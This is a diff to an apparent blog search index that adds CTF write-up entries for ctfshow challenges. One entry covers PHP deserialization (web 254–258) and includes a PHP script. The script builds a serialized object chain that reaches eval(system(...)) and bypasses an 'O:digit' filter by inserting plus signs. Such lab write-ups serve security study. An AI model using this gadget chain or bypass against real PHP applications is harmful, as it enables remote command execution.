@@ -4,6 +4,56 @@
   
     
     <entry>
+      <title>ctfshow-网络迷踪</title>
+      <link href="/2022/02/11/ctfshow-wang-luo-mi-zong/"/>
+      <url>/2022/02/11/ctfshow-wang-luo-mi-zong/</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+      
+      <categories>
+          
+          <category> ctfshow </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 网络迷踪 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>ctfshow-反序列化</title>
+      <link href="/2022/02/11/ctfshow-fan-xu-lie-hua/"/>
+      <url>/2022/02/11/ctfshow-fan-xu-lie-hua/</url>
+      
+        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="web-254"><a href="#web-254" class="headerlink" title="web 254"></a>web 254</h2><p><img src="C:/Users/86181/AppData/Roaming/Typora/typora-user-images/image-20220211200642336.png" alt="image-20220211200642336"></p><h2 id="web-255"><a href="#web-255" class="headerlink" title="web 255"></a>web 255</h2><p><img src="C:/Users/86181/AppData/Roaming/Typora/typora-user-images/image-20220211214644016.png" alt="image-20220211214644016"></p><h2 id="web-256"><a href="#web-256" class="headerlink" title="web 256"></a>web 256</h2><pre class="line-numbers language-none"><code class="language-none">if($this-&gt;username!==$this-&gt;password){                    echo "your flag is ".$flag;              }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="C:/Users/86181/AppData/Roaming/Typora/typora-user-images/image-20220211214849464.png" alt="image-20220211214849464"></p><p><img src="C:/Users/86181/AppData/Roaming/Typora/typora-user-images/image-20220211214858756.png" alt="image-20220211214858756"></p><h2 id="web-257-258"><a href="#web-257-258" class="headerlink" title="web 257-258"></a>web 257-258</h2><p> 258多了一个过滤   要求不能出现O/C:数字的形式，我们可以将序列化中的类似形式更改为O/C:+数字的形式来绕过过滤：</p><pre class="line-numbers language-none"><code class="language-none">/*增加 $this-&gt;class=new backDoor();public $code="system('tac *f');";*/&lt;?phpclass ctfShowUser{    public $class ;    public function __construct(){        $this-&gt;class=new backDoor();    }    public function login($u,$p){        return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;    }    public function __destruct(){        $this-&gt;class-&gt;getInfo();    }}class info{    public $user;    public function __construct(){    }    public function getInfo(){        return $this-&gt;user;    }}class backDoor{    public $code="system('tac f*');";    public function getInfo(){echo "getshell";        eval($this-&gt;code);    }}$a = serialize(new ctfShowUser());$b = str_replace('O:11','O:+11',$a); // 对匹配的形式进行替换，在数字前增加加号$c = str_replace('O:8','O:+8',$b);echo urlencode($c);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="C:/Users/86181/AppData/Roaming/Typora/typora-user-images/image-20220211224837338.png" alt="image-20220211224837338"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> ctfshow </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 反序列化 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>ctfshow-爆破</title>
       <link href="/2022/01/24/ctfshow-bao-po/"/>
       <url>/2022/01/24/ctfshow-bao-po/</url>
